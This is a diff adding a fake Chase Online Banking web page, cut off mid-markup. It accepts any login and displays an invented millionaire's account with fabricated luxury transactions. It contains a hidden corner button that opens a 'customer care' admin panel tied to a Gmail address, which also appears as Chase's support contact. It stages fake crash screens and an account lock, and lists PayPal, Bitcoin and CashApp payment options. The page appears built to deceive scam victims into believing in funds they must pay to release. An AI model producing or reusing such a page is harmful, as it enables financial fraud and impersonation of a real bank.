@@ -1,2 +1,617 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chase Online Banking</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        * { font-family: 'Inter', sans-serif; }
+        .fade-in { animation: fadeIn 0.3s ease-in; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .slide-in { animation: slideIn 0.3s ease-out; }
+        @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
+        .balance-hidden { filter: blur(8px); user-select: none; }
+        .custom-scrollbar::-webkit-scrollbar { width: 6px; }
+        .notification-badge { animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
+        .crash-overlay { animation: glitch 0.3s ease-in-out; }
+        @keyframes glitch { 0%, 100% { transform: translate(0); } 20% { transform: translate(-2px, 2px); } 40% { transform: translate(2px, -2px); } 60% { transform: translate(-2px, -2px); } 80% { transform: translate(2px, 2px); } }
+        .camera-preview { width: 100%; height: 200px; background: #1a1a1a; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #666; }
+        .secret-corner { position: fixed; bottom: 0; right: 0; width: 30px; height: 30px; opacity: 0; cursor: pointer; z-index: 9999; }
+        .secret-corner:hover { opacity: 0.05; background: rgba(0,0,0,0.1); }
+    </style>
+</head>
+<body class="bg-gray-50">
+    <div id="app"></div>
+    <div class="secret-corner" onclick="showSecretLogin()" title=""></div>
+
+    <script>
+        // ==================== CONFIGURATION ====================
+        const CONFIG = {
+            adminEmail: 'agent.chaseservice@gmail.com',
+            adminPassword: 'admin123',
+            transferPIN: '1234'
+        };
+
+        // ==================== STORAGE ====================
+        const Storage = {
+            getName: () => localStorage.getItem('chase_name') || 'Patrick Lormard',
+            setName: (v) => localStorage.setItem('chase_name', v),
+            getBalance: () => parseFloat(localStorage.getItem('chase_balance') || '1200000'),
+            setBalance: (v) => localStorage.setItem('chase_balance', v.toString()),
+            getAccountNumber: () => localStorage.getItem('chase_account') || '4587219634',
+            setAccountNumber: (v) => localStorage.setItem('chase_account', v),
+            getDOB: () => localStorage.getItem('chase_dob') || '22/Aug/1961',
+            setDOB: (v) => localStorage.setItem('chase_dob', v),
+            getAddress: () => localStorage.getItem('chase_address') || 'Savannah, Georgia',
+            setAddress: (v) => localStorage.setItem('chase_address', v),
+            getEmail: () => localStorage.getItem('chase_email') || 'patrick.lormard@email.com',
+            setEmail: (v) => localStorage.setItem('chase_email', v),
+            getPhone: () => localStorage.getItem('chase_phone') || '(912) 555-0147',
+            setPhone: (v) => localStorage.setItem('chase_phone', v),
+            getLocked: () => localStorage.getItem('chase_locked') === 'true',
+            setLocked: (v) => localStorage.setItem('chase_locked', v.toString()),
+            getHistory: () => JSON.parse(localStorage.getItem('chase_history') || '[]'),
+            setHistory: (v) => localStorage.setItem('chase_history', JSON.stringify(v)),
+            getPendingTransfers: () => JSON.parse(localStorage.getItem('chase_pending') || '[]'),
+            setPendingTransfers: (v) => localStorage.setItem('chase_pending', JSON.stringify(v)),
+            getNotifications: () => JSON.parse(localStorage.getItem('chase_notifications') || '[]'),
+            setNotifications: (v) => localStorage.setItem('chase_notifications', JSON.stringify(v)),
+            isLoggedIn: () => localStorage.getItem('chase_logged_in') === 'true',
+            setLoggedIn: (v) => localStorage.setItem('chase_logged_in', v.toString()),
+            getLastView: () => localStorage.getItem('chase_last_view') || 'dashboard',
+            setLastView: (v) => localStorage.setItem('chase_last_view', v),
+            getShowBalance: () => localStorage.getItem('chase_show_balance') !== 'false',
+            setShowBalance: (v) => localStorage.setItem('chase_show_balance', v.toString()),
+            getShowAccount: () => localStorage.getItem('chase_show_account') !== 'false',
+            setShowAccount: (v) => localStorage.setItem('chase_show_account', v.toString())
+        };
+
+        // ==================== STATE ====================
+        let currentView = 'login';
+        let showBalanceValue = true;
+        let showAccountValue = true;
+
+        // ==================== INITIAL DATA ====================
+        function initializeData() {
+            if (localStorage.getItem('chase_data_version') !== '2025') {
+                localStorage.removeItem('chase_initialized');
+                localStorage.removeItem('chase_history');
+                localStorage.removeItem('chase_notifications');
+                localStorage.setItem('chase_data_version', '2025');
+            }
+            if (!localStorage.getItem('chase_initialized')) {
+                const history = [
+                    { date: '2025-12-28', description: 'Year-End Bonus Deposit', amount: 125000, type: 'credit' },
+                    { date: '2025-12-24', description: 'Holiday Gift Purchases', amount: -5847.50, type: 'debit' },
+                    { date: '2025-12-20', description: 'Tesla Cybertruck Payment', amount: -98990, type: 'debit' },
+                    { date: '2025-12-15', description: 'Amazon.com Purchase', amount: -3245.99, type: 'debit' },
+                    { date: '2025-12-10', description: 'Quarterly Dividend Payment', amount: 28500, type: 'credit' },
+                    { date: '2025-12-05', description: 'Luxury Resort Booking - Maldives', amount: -45800, type: 'debit' },
+                    { date: '2025-11-28', description: 'Black Friday Shopping', amount: -12750, type: 'debit' },
+                    { date: '2025-11-25', description: 'Consulting Project Payment', amount: 75000, type: 'credit' },
+                    { date: '2025-11-18', description: 'Private Jet Charter', amount: -28500, type: 'debit' },
+                    { date: '2025-11-15', description: 'Stock Dividend - Apple Inc', amount: 18500, type: 'credit' },
+                    { date: '2025-11-10', description: 'Rolex Authorized Dealer', amount: -47500, type: 'debit' },
+                    { date: '2025-11-05', description: 'Property Tax Payment', amount: -28500, type: 'debit' },
+                    { date: '2025-10-31', description: 'Halloween Charity Gala', amount: -15000, type: 'debit' },
+                    { date: '2025-10-25', description: 'Real Estate Rental Income', amount: 45000, type: 'credit' },
+                    { date: '2025-10-20', description: 'Walmart Supercenter', amount: -2387.45, type: 'debit' },
+                    { date: '2025-10-15', description: 'Investment Portfolio Return', amount: 125000, type: 'credit' },
+                    { date: '2025-10-10', description: 'Home Renovation - Kitchen', amount: -87500, type: 'debit' },
+                    { date: '2025-10-05', description: 'Mercedes-Benz S-Class', amount: -145000, type: 'debit' },
+                    { date: '2025-09-30', description: 'Quarterly Business Profit', amount: 225000, type: 'credit' },
+                    { date: '2025-09-25', description: 'Art Auction - Contemporary', amount: -125000, type: 'debit' },
+                    { date: '2025-09-20', description: 'Stock Options Exercise', amount: 385000, type: 'credit' },
+                    { date: '2025-09-15', description: 'Yacht Maintenance', amount: -45000, type: 'debit' },
+                    { date: '2025-09-10', description: 'Private Equity Distribution', amount: 285000, type: 'credit' },
+                    { date: '2025-09-05', description: 'Luxury Furniture - Restoration Hardware', amount: -68500, type: 'debit' },
+                    { date: '2025-08-31', description: 'Summer Villa Rental Income', amount: 85000, type: 'credit' },
+                    { date: '2025-08-25', description: 'European Vacation - France & Italy', amount: -78500, type: 'debit' },
+                    { date: '2025-08-20', description: 'Tech Investment Return', amount: 195000, type: 'credit' },
+                    { date: '2025-08-15', description: 'Gucci Boutique Purchase', amount: -18500, type: 'debit' },
+                    { date: '2025-08-10', description: 'Commercial Property Sale', amount: 850000, type: 'credit' },
+                    { date: '2025-08-05', description: 'Home Depot - Landscaping', amount: -2247.83, type: 'debit' },
+                    { date: '2025-07-31', description: 'Annual Performance Bonus', amount: 285000, type: 'credit' },
+                    { date: '2025-07-25', description: 'Property Management Fees', amount: -18500, type: 'debit' },
+                    { date: '2025-07-20', description: 'Stock Sale - Microsoft', amount: 425000, type: 'credit' },
+                    { date: '2025-07-15', description: 'Charitable Donation - United Way', amount: -50000, type: 'debit' },
+                    { date: '2025-07-10', description: 'Luxury Watch Collection', amount: -125000, type: 'debit' },
+                    { date: '2025-07-05', description: 'Business Acquisition Payment', amount: -450000, type: 'debit' },
+                    { date: '2025-06-30', description: 'Quarterly Dividend - Multiple Stocks', amount: 68500, type: 'credit' },
+                    { date: '2025-06-25', description: 'Tesla Service & Upgrade', amount: -18990, type: 'debit' },
+                    { date: '2025-06-20', description: 'Consulting Fee - Major Client', amount: 185000, type: 'credit' },
+                    { date: '2025-06-15', description: 'Private School Tuition', amount: -75000, type: 'debit' },
+                    { date: '2025-06-10', description: 'Investment Property Purchase', amount: -685000, type: 'debit' },
+                    { date: '2025-06-05', description: 'Royalty Payment - Patent', amount: 125000, type: 'credit' },
+                    { date: '2025-05-31', description: 'Memorial Day Weekend - Hamptons', amount: -28500, type: 'debit' },
+                    { date: '2025-05-25', description: 'Stock Portfolio Rebalance', amount: 325000, type: 'credit' },
+                    { date: '2025-05-20', description: 'Luxury Vehicle Fleet - BMW', amount: -285000, type: 'debit' },
+                    { date: '2025-05-15', description: 'Merger Proceeds - Tech Company', amount: 1250000, type: 'credit' },
+                    { date: '2025-05-10', description: 'Fine Dining - Michelin Restaurants', amount: -12500, type: 'debit' },
+                    { date: '2025-05-05', description: 'Office Building Renovation', amount: -385000, type: 'debit' },
+                    { date: '2025-04-30', description: 'Quarterly Business Revenue', amount: 485000, type: 'credit' },
+                    { date: '2025-04-25', description: 'Art Basel Purchase', amount: -225000, type: 'debit' },
+                    { date: '2025-04-20', description: 'Stock Sale Proceeds - Amazon', amount: 685000, type: 'credit' },
+                    { date: '2025-04-15', description: 'Luxury Spa & Wellness Retreat', amount: -18500, type: 'debit' },
+                    { date: '2025-04-10', description: 'Warehouse Equipment Purchase', amount: -145000, type: 'debit' },
+                    { date: '2025-04-05', description: 'Startup Investment Return', amount: 525000, type: 'credit' },
+                    { date: '2025-03-31', description: 'Spring Break - Caribbean Cruise', amount: -48500, type: 'debit' },
+                    { date: '2025-03-25', description: 'Real Estate Commission', amount: 285000, type: 'credit' },
+                    { date: '2025-03-20', description: 'Luxury Apartment Down Payment', amount: -485000, type: 'debit' },
+                    { date: '2025-03-15', description: 'Annual Stock Dividend', amount: 125000, type: 'credit' },
+                    { date: '2025-03-10', description: 'Designer Wardrobe - Paris', amount: -68500, type: 'debit' },
+                    { date: '2025-03-05', description: 'Business Expansion Loan Payment', amount: -285000, type: 'debit' },
+                    { date: '2025-02-28', description: 'Valentines Day Charity Ball', amount: -25000, type: 'debit' },
+                    { date: '2025-02-25', description: 'Investment Fund Distribution', amount: 385000, type: 'credit' },
+                    { date: '2025-02-20', description: 'Superyacht Charter - Caribbean', amount: -185000, type: 'debit' },
+                    { date: '2025-02-15', description: 'Tech IPO Investment Return', amount: 925000, type: 'credit' },
+                    { date: '2025-02-10', description: 'Private Security Services', amount: -45000, type: 'debit' },
+                    { date: '2025-02-05', description: 'Luxury Home Theater Installation', amount: -125000, type: 'debit' },
+                    { date: '2025-01-31', description: 'January Performance Bonus', amount: 185000, type: 'credit' },
+                    { date: '2025-01-25', description: 'Ski Trip - Aspen Colorado', amount: -68500, type: 'debit' },
+                    { date: '2025-01-20', description: 'Stock Options - Exercise & Sell', amount: 785000, type: 'credit' },
+                    { date: '2025-01-15', description: 'New Year Gala Donation', amount: -50000, type: 'debit' },
+                    { date: '2025-01-10', description: 'Luxury Vehicle Purchase - Porsche', amount: -225000, type: 'debit' },
+                    { date: '2025-01-05', description: 'Annual Business Profit Share', amount: 685000, type: 'credit' },
+                    { date: '2025-01-01', description: 'New Year Celebration - Private Event', amount: -85000, type: 'debit' }
+                ];
+                Storage.setHistory(history);
+
+                const notifications = [
+                    { id: 1, title: 'Welcome to Chase 2025', message: 'Your account is now active for the new year', date: '2025-01-01', read: false },
+                    { id: 2, title: 'Security Alert', message: 'New device login detected', date: '2025-12-28', read: false },
+                    { id: 3, title: 'Large Transaction', message: 'Year-end bonus deposited', date: '2025-12-28', read: false },
+                    { id: 4, title: 'Investment Update', message: 'Your portfolio has grown 15% this year', date: '2025-12-20', read: true },
+                    { id: 5, title: 'Statement Available', message: 'Your December 2025 statement is ready', date: '2025-12-15', read: true }
+                ];
+                Storage.setNotifications(notifications);
+
+                const paymentMethods = [
+                    { id: 1, type: 'paypal', name: 'PayPal', connected: true, email: 'patrick.lormard@paypal.com' },
+                    { id: 2, type: 'bitcoin', name: 'Bitcoin Wallet', connected: false, address: '' },
+                    { id: 3, type: 'cashapp', name: 'CashApp', connected: false, handle: '' }
+                ];
+                Storage.setPaymentMethods(paymentMethods);
+
+                localStorage.setItem('chase_initialized', 'true');
+            }
+        }
+
+        // ==================== SESSION ====================
+        function checkSession() {
+            showBalanceValue = Storage.getShowBalance();
+            showAccountValue = Storage.getShowAccount();
+            if (Storage.isLoggedIn()) {
+                if (Storage.getLocked() && currentView !== 'customercare') {
+                    currentView = 'login';
+                    showToast('Account is locked. Contact customer care.', 'error');
+                } else {
+                    currentView = Storage.getLastView();
+                }
+            } else {
+                currentView = 'login';
+            }
+        }
+
+        function logout() {
+            Storage.setLoggedIn(false);
+            Storage.setLastView('dashboard');
+            currentView = 'login';
+            render();
+        }
+
+        // ==================== TOAST ====================
+        function showToast(message, type) {
+            const toast = document.createElement('div');
+            const colors = { success: 'bg-green-500', error: 'bg-red-500', warning: 'bg-yellow-500', info: 'bg-blue-500' };
+            toast.className = 'fixed top-4 right-4 ' + colors[type] + ' text-white px-6 py-3 rounded-lg shadow-lg z-50 slide-in flex items-center gap-2';
+            let icon = 'fa-info-circle';
+            if (type === 'success') icon = 'fa-check-circle';
+            if (type === 'error') icon = 'fa-exclamation-circle';
+            toast.innerHTML = '<i class="fas ' + icon + '"></i><span>' + message + '</span>';
+            document.body.appendChild(toast);
+            setTimeout(function() { toast.remove(); }, 4000);
+        }
+
+        // ==================== MODAL ====================
+        function showModal(title, content, onConfirm, showCancel) {
+            const modal = document.createElement('div');
+            modal.id = 'active-modal';
+            modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4';
+            let cancelBtn = '';
+            let confirmBtn = '';
+            if (showCancel !== false) cancelBtn = '<button onclick="closeModal()" class="px-4 py-2 text-gray-600 hover:text-gray-800">Cancel</button>';
+            if (onConfirm) confirmBtn = '<button onclick="modalConfirm()" class="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700">Confirm</button>';
+            modal.innerHTML = '<div class="bg-white rounded-xl shadow-2xl max-w-md w-full fade-in"><div class="p-6 border-b border-gray-200"><h3 class="text-xl font-semibold text-gray-900">' + title + '</h3></div><div class="p-6">' + content + '</div><div class="p-6 border-t border-gray-200 flex gap-3 justify-end">' + cancelBtn + confirmBtn + '</div></div>';
+            document.body.appendChild(modal);
+            window.modalConfirm = function() { closeModal(); if (onConfirm) onConfirm(); };
+        }
+
+        function closeModal() {
+            const modal = document.getElementById('active-modal');
+            if (modal) modal.remove();
+        }
+
+        // ==================== CRASH ====================
+        function showCrashEffect() {
+            const overlay = document.createElement('div');
+            overlay.className = 'fixed inset-0 bg-red-900 bg-opacity-90 z-[100] flex items-center justify-center crash-overlay';
+            overlay.innerHTML = '<div class="text-center text-white"><div class="text-6xl mb-4"><i class="fas fa-exclamation-triangle"></i></div><h2 class="text-3xl font-bold mb-2">SYSTEM ERROR</h2><p class="text-red-200">Service temporarily unavailable</p><div class="mt-4 text-sm text-red-300 font-mono">Error Code: 0x80070057</div></div>';
+            document.body.appendChild(overlay);
+            setTimeout(function() { overlay.remove(); }, 1500);
+        }
+
+        // ==================== SECRET LOGIN ====================
+        function showSecretLogin() {
+            const content = '<form class="space-y-4"><div class="text-center mb-4"><i class="fas fa-user-shield text-4xl text-blue-600"></i><p class="text-sm text-gray-500 mt-2">Customer Care Portal</p></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Email</label><input type="email" id="secret-email" placeholder="Enter admin email" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200"></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Password</label><input type="password" id="secret-password" placeholder="Enter password" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200"></div></form>';
+            showModal('Customer Care Login', content, function() {
+                const email = document.getElementById('secret-email').value;
+                const password = document.getElementById('secret-password').value;
+                if (email === CONFIG.adminEmail && password === CONFIG.adminPassword) {
+                    closeModal();
+                    Storage.setLoggedIn(true);
+                    Storage.setLastView('customercare');
+                    showToast('Welcome to Customer Care Portal', 'success');
+                    currentView = 'customercare';
+                    render();
+                } else {
+                    showToast('Invalid credentials', 'error');
+                }
+            });
+        }
+
+        // ==================== LOGIN HANDLER ====================
+        function handleLogin(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (Storage.getLocked()) {
+                showToast('Account is locked. Contact customer care.', 'error');
+                return;
+            }
+            
+            if (username && password) {
+                Storage.setLoggedIn(true);
+                Storage.setLastView('dashboard');
+                const notifications = Storage.getNotifications();
+                notifications.unshift({ id: Date.now(), title: 'New Login Detected', message: 'Login detected from new device', date: new Date().toISOString().split('T')[0], read: false });
+                Storage.setNotifications(notifications);
+                showToast('Welcome back, ' + Storage.getName().split(' ')[0] + '!', 'success');
+                currentView = 'dashboard';
+                render();
+            }
+        }
+
+        function showEnrollment() {
+            const content = '<form class="space-y-4"><div><label class="block text-sm font-medium text-gray-700 mb-1">Username</label><input type="text" id="enroll-username" class="w-full h-12 px-4 border border-gray-300 rounded-lg" required></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Password</label><input type="password" id="enroll-password" class="w-full h-12 px-4 border border-gray-300 rounded-lg" required></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Email</label><input type="email" id="enroll-email" class="w-full h-12 px-4 border border-gray-300 rounded-lg" required></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Phone</label><input type="tel" id="enroll-phone" class="w-full h-12 px-4 border border-gray-300 rounded-lg" required></div></form>';
+            showModal('Enroll', content, function() {
+                setTimeout(function() { closeModal(); showCrashEffect(); setTimeout(function() { showToast('System Error: Enrollment service temporarily unavailable.', 'error'); }, 500); }, 1000);
+            });
+        }
+
+        function showForgotPassword() {
+            const content = '<form class="space-y-4"><p class="text-gray-600 text-sm mb-4">Enter your email address to reset password.</p><div><label class="block text-sm font-medium text-gray-700 mb-1">Email</label><input type="email" id="forgot-email" class="w-full h-12 px-4 border border-gray-300 rounded-lg" required></div></form>';
+            showModal('Forgot Password', content, function() {
+                setTimeout(function() { closeModal(); showCrashEffect(); setTimeout(function() { showToast('System Error: Password reset service temporarily unavailable.', 'error'); }, 500); }, 1000);
+            });
+        }
+
+        function showContact() {
+            const content = '<div class="space-y-4"><div class="flex items-start gap-3"><i class="fas fa-building text-blue-600 mt-1"></i><div><p class="font-medium">Chase Bank Headquarters</p><p class="text-gray-600 text-sm">270 Park Avenue, New York, NY 10017</p></div></div><div class="flex items-start gap-3"><i class="fas fa-phone text-blue-600 mt-1"></i><div><p class="font-medium">Customer Service</p><p class="text-gray-600 text-sm">1-800-935-9935 (24/7)</p></div></div><div class="flex items-start gap-3"><i class="fas fa-envelope text-blue-600 mt-1"></i><div><p class="font-medium">Email Support</p><p class="text-gray-600 text-sm">' + CONFIG.adminEmail + '</p></div></div><div class="flex items-start gap-3"><i class="fas fa-map-marker-alt text-blue-600 mt-1"></i><div><p class="font-medium">Branch Locator</p><p class="text-gray-600 text-sm">chase.com/locations</p></div></div></div>';
+            showModal('Contact Us', content, null, false);
+        }
+
+        // ==================== RENDER LOGIN ====================
+        function renderLogin(container) {
+            container.innerHTML = '<div class="min-h-screen bg-gradient-to-br from-blue-900 via-blue-800 to-blue-900 flex flex-col relative"><header class="bg-white shadow-sm"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between"><div class="flex items-center gap-2"><div class="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center"><span class="text-white font-bold text-xl">C</span></div><span class="text-blue-900 font-bold text-2xl tracking-tight">CHASE</span></div><button onclick="showContact()" class="text-sm text-gray-600 hover:text-blue-600">Contact Us</button></div></header><div class="flex-1 flex items-center justify-center p-4"><div class="w-full max-w-md bg-white rounded-xl shadow-2xl p-8 fade-in"><h1 class="text-2xl font-semibold text-gray-900 text-center mb-2">Welcome to Chase Online</h1><p class="text-center text-gray-500 text-sm mb-6">Sign in to access your accounts</p><form onsubmit="handleLogin(event)" class="space-y-4"><div><label class="block text-sm font-medium text-gray-700 mb-1">Username</label><input type="text" id="username" placeholder="Enter username" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200 transition-all" required></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Password</label><input type="password" id="password" placeholder="Enter password" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200 transition-all" required></div><div class="flex items-center justify-between text-sm"><label class="flex items-center gap-2 cursor-pointer"><input type="checkbox" class="rounded border-gray-300 text-blue-600 focus:ring-blue-500"><span class="text-gray-600">Remember me</span></label><button type="button" onclick="showForgotPassword()" class="text-blue-600 hover:text-blue-700">Forgot password?</button></div><button type="submit" class="w-full h-12 bg-blue-600 text-white font-medium rounded-lg hover:bg-blue-700 transition-colors">Sign In</button></form><div class="mt-6 pt-6 border-t border-gray-200 text-center"><p class="text-gray-600 text-sm mb-3">New to Chase Online?</p><button onclick="showEnrollment()" class="w-full h-12 border-2 border-blue-600 text-blue-600 font-medium rounded-lg hover:bg-blue-50 transition-colors">Enroll</button></div></div></div><footer class="bg-blue-950 text-white py-6"><div class="max-w-7xl mx-auto px-4 text-center text-sm text-blue-200"><p>&copy; 2025 JPMorgan Chase & Co. All rights reserved.</p><p class="mt-2">Equal Opportunity Lender</p></div></footer></div>';
+        }
+
+        // ==================== RENDER DASHBOARD ====================
+        function renderDashboard(container) {
+            const balance = Storage.getBalance();
+            const history = Storage.getHistory().slice(0, 5);
+            const notifications = Storage.getNotifications();
+            const unreadCount = notifications.filter(function(n) { return !n.read; }).length;
+            let unreadBadge = unreadCount > 0 ? '<span class="absolute -top-1 -right-1 w-5 h-5 bg-red-500 text-white text-xs rounded-full flex items-center justify-center notification-badge">' + unreadCount + '</span>' : '';
+            
+            let historyHtml = '';
+            for (let i = 0; i < history.length; i++) {
+                const item = history[i];
+                const iconClass = item.type === 'credit' ? 'fa-arrow-down text-green-600' : 'fa-arrow-up text-red-600';
+                const bgClass = item.type === 'credit' ? 'bg-green-100' : 'bg-red-100';
+                const amountClass = item.type === 'credit' ? 'text-green-600' : 'text-red-600';
+                const sign = item.type === 'credit' ? '+' : '';
+                historyHtml += '<div class="p-4 flex items-center justify-between hover:bg-gray-50 transition-colors"><div class="flex items-center gap-4"><div class="w-10 h-10 ' + bgClass + ' rounded-full flex items-center justify-center"><i class="fas ' + iconClass + '"></i></div><div><p class="font-medium text-gray-900">' + item.description + '</p><p class="text-sm text-gray-500">' + item.date + '</p></div></div><span class="font-semibold ' + amountClass + '">' + sign + '$' + Math.abs(item.amount).toLocaleString('en-US', {minimumFractionDigits: 2}) + '</span></div>';
+            }
+            
+            const balanceDisplay = showBalanceValue ? balance.toLocaleString('en-US', {minimumFractionDigits: 2}) : '****';
+            const accountDisplay = showAccountValue ? Storage.getAccountNumber() : '****';
+            
+            container.innerHTML = '<div class="min-h-screen bg-gray-50"><header class="bg-white shadow-sm sticky top-0 z-40"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8"><div class="flex items-center justify-between h-16"><div class="flex items-center gap-4"><button onclick="showProfileMenu()" class="flex items-center gap-3 hover:bg-gray-100 rounded-lg p-2 transition-colors"><div class="w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center"><span class="text-white font-semibold">' + Storage.getName().split(' ').map(function(n) { return n[0]; }).join('') + '</span></div><div class="hidden sm:block text-left"><p class="text-sm font-medium text-gray-900">' + Storage.getName() + '</p><p class="text-xs text-gray-500">' + Storage.getAccountNumber() + '</p></div></button></div><div class="flex items-center gap-4"><button onclick="showSettings()" class="p-2 text-gray-600 hover:text-blue-600 transition-colors"><i class="fas fa-cog text-xl"></i></button><button onclick="showNotifications()" class="relative p-2 text-gray-600 hover:text-blue-600 transition-colors"><i class="fas fa-bell text-xl"></i>' + unreadBadge + '</button><button onclick="showSearch()" class="p-2 text-gray-600 hover:text-blue-600 transition-colors"><i class="fas fa-search text-xl"></i></button><button onclick="logout()" class="px-4 py-2 text-sm text-gray-600 hover:text-red-600 transition-colors"><i class="fas fa-sign-out-alt mr-2"></i>Logout</button></div></div></div></header><main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8"><div class="bg-gradient-to-r from-blue-600 to-blue-800 rounded-2xl p-8 text-white mb-8 shadow-xl"><div class="flex items-center justify-between mb-4"><div><p class="text-blue-100 text-sm">Available Balance</p><h2 class="text-4xl font-bold mt-1">$' + balanceDisplay + '</h2></div><div class="flex gap-2"><button onclick="toggleBalanceDisplay()" class="p-3 bg-white bg-opacity-20 rounded-lg hover:bg-opacity-30 transition-colors"><i class="fas ' + (showBalanceValue ? 'fa-eye-slash' : 'fa-eye') + ' text-xl"></i></button><button onclick="toggleAccountDisplay()" class="p-3 bg-white bg-opacity-20 rounded-lg hover:bg-opacity-30 transition-colors"><i class="fas fa-hashtag text-xl"></i></button></div></div><div class="flex items-center gap-6 text-sm text-blue-100"><span>Account Number: ' + accountDisplay + '</span><span>|</span><span>Checking Account</span></div></div><div class="mb-8"><h3 class="text-lg font-semibold text-gray-900 mb-4">Quick Actions</h3><div class="grid grid-cols-2 md:grid-cols-4 gap-4"><button onclick="showTransferModal()" class="bg-white p-6 rounded-xl shadow-sm hover:shadow-md transition-shadow text-center"><div class="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-3"><i class="fas fa-exchange-alt text-blue-600 text-xl"></i></div><p class="text-sm font-medium text-gray-900">Transfer Money</p></button><button onclick="showPayBillModal()" class="bg-white p-6 rounded-xl shadow-sm hover:shadow-md transition-shadow text-center"><div class="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3"><i class="fas fa-file-invoice-dollar text-green-600 text-xl"></i></div><p class="text-sm font-medium text-gray-900">Pay Bill</p></button><button onclick="showDepositModal()" class="bg-white p-6 rounded-xl shadow-sm hover:shadow-md transition-shadow text-center"><div class="w-12 h-12 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-3"><i class="fas fa-camera text-purple-600 text-xl"></i></div><p class="text-sm font-medium text-gray-900">Deposit Check</p></button><button onclick="showPaymentMethods()" class="bg-white p-6 rounded-xl shadow-sm hover:shadow-md transition-shadow text-center"><div class="w-12 h-12 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-3"><i class="fas fa-credit-card text-orange-600 text-xl"></i></div><p class="text-sm font-medium text-gray-900">Payment Methods</p></button></div></div><div class="bg-white rounded-xl shadow-sm"><div class="p-6 border-b border-gray-200 flex items-center justify-between"><h3 class="text-lg font-semibold text-gray-900">Recent Activity</h3><button onclick="showFullHistory()" class="text-blue-600 hover:text-blue-700 text-sm font-medium">View All</button></div><div class="divide-y divide-gray-200">' + historyHtml + '</div></div></main></div>';
+        }
+
+        // ==================== RENDER SETTINGS ====================
+        function renderSettings(container) {
+            container.innerHTML = '<div class="min-h-screen bg-gray-50"><header class="bg-white shadow-sm sticky top-0 z-40"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8"><div class="flex items-center justify-between h-16"><button onclick="currentView=\'dashboard\';Storage.setLastView(\'dashboard\');render()" class="text-gray-600 hover:text-blue-600"><i class="fas fa-arrow-left mr-2"></i>Back</button><h1 class="text-xl font-semibold text-gray-900">Settings</h1><button onclick="logout()" class="text-red-600 hover:text-red-700"><i class="fas fa-sign-out-alt mr-2"></i>Logout</button></div></div></header><main class="max-w-3xl mx-auto px-4 sm:px-6 lg:px-8 py-8"><div class="space-y-6"><div class="bg-white rounded-xl shadow-sm p-6"><h3 class="text-lg font-semibold text-gray-900 mb-4">Personal Information</h3><div class="space-y-4"><div class="flex justify-between items-center p-3 bg-gray-50 rounded-lg"><span class="text-gray-600">Age</span><span class="font-medium text-gray-900">' + Storage.getDOB() + '</span></div><div class="flex justify-between items-center p-3 bg-gray-50 rounded-lg"><span class="text-gray-600">State of Origin</span><span class="font-medium text-gray-900">' + Storage.getAddress() + '</span></div></div></div><div class="bg-white rounded-xl shadow-sm p-6"><h3 class="text-lg font-semibold text-gray-900 mb-4">Profile Information</h3><div class="space-y-4"><div><label class="block text-sm font-medium text-gray-700 mb-1">Full Name</label><input type="text" id="settings-name" value="' + Storage.getName() + '" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200"></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Email</label><input type="email" id="settings-email" value="' + Storage.getEmail() + '" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200"></div><div><label class="block text-sm font-medium text-gray-700 mb-1">Phone</label><input type="tel" id="settings-phone" value="' + Storage.getPhone() + '" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200"></div></div></div><div class="bg-white rounded-xl shadow-sm p-6"><h3 class="text-lg font-semibold text-gray-900 mb-4">Security</h3><div class="space-y-4"><div><label class="block text-sm font-medium text-gray-700 mb-1">Current Password</label><input type="password" placeholder="Enter current password" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200"></div><div><label class="block text-sm font-medium text-gray-700 mb-1">New Password</label><input type="password" placeholder="Enter new password" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200"></div></div></div><button onclick="saveSettings()" class="w-full h-12 bg-blue-600 text-white font-medium rounded-lg hover:bg-blue-700 transition-colors">Save 